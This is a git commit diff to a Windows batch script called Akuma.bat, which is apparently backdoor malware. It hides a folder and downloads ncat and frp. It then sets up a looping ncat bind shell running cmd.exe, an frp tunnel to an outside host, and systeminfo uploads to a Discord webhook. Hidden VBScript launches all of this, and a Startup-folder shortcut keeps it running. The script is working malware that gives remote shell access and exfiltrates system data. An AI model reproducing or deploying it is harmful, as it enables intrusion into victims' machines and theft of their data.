310778367d275dc2956b7d6644865f0672279585
l_ <112792604+l-urk@users.noreply.github.com>
2023-10-16 08:50:34 -0700

    Update Akuma.bat

--- Akuma.bat
+++ Akuma.bat
@@ -4,23 +4,24 @@ mkdir %homedrive%\Akuma
 attrib +h %homedrive%\Akuma
 cd %homedrive%\Akuma
 curl -O https://nmap.org/dist/ncat-portable-5.59BETA1.zip
-curl -O https://github.com/fatedier/frp/releases/download/v0.52.1/frp_0.52.1_windows_amd64.zip
-tar -xf ncat-portable-5.59BETA1.zip
-tar -xf frp_0.52.1_windows_amd64.zip
+curl -L https://github.com/fatedier/frp/releases/download/v0.52.1/frp_0.52.1_windows_amd64.zip > frp_0.52.1_windows_amd64.zip
 echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
-echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=bot" https://discord.com/api/webhooks/1163478530538082437/riroyuxV8prESa8RqsYDxyLGPqksgCDMyGMwvuNxOyXkC8fzIgkvvpCUdzMU6Xlgj6Ht >> %homedrive%\Akuma\zonbi.bat
+echo curl -X POST -H "Content-Type: multipart/form-data" -F "file=@%homedrive%\Akuma\systeminfo.txt" -F "content=zombi " https://discord.com/api/webhooks/1163478530538082437/riroyuxV8prESa8RqsYDxyLGPqksgCDMyGMwvuNxOyXkC8fzIgkvvpCUdzMU6Xlgj6Ht >> %homedrive%\Akuma\zonbi.bat
 echo :start >> %homedrive%\Akuma\ncat.bat
 echo %homedrive%\Akuma\ncat-portable-5.59BETA1\ncat.exe -lvp 32100 -e cmd.exe >> %homedrive%\Akuma\ncat.bat
 echo goto start >> %homedrive%\Akuma\ncat.bat
-echo serverAddr = "4kum4n0d3z3r0.xyz" >> %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.ini
-echo serverPort = 32101 >> %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.ini
 echo :start >> %homedrive%\Akuma\frpc.bat
-echo %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.exe
+echo cd %homedrive%\Akuma\frp_0.52.1_windows_amd64 >> %homedrive%\Akuma\frpc.bat
+echo %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.exe >> %homedrive%\Akuma\frpc.bat
 echo goto start >> %homedrive%\Akuma\frpc.bat
 echo Set objShell = CreateObject("WScript.Shell") >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\ncat.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\frpc.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
 echo objShell.Run "%homedrive%\Akuma\zonbi.bat", 0, False >> %homedrive%\Akuma\Akuma.vbs
+tar -xf ncat-portable-5.59BETA1.zip
+tar -xf frp_0.52.1_windows_amd64.zip
+echo serverAddr = "4kum4n0d3z3r0.xyz" >> %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.ini
+echo serverPort = 32101 >> %homedrive%\Akuma\frp_0.52.1_windows_amd64\frpc.ini
 start %homedrive%\Akuma\Akuma.vbs
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\Akuma.lnk');$s.TargetPath='%homedrive%\Akuma\Akuma.vbs';$s.Save()"
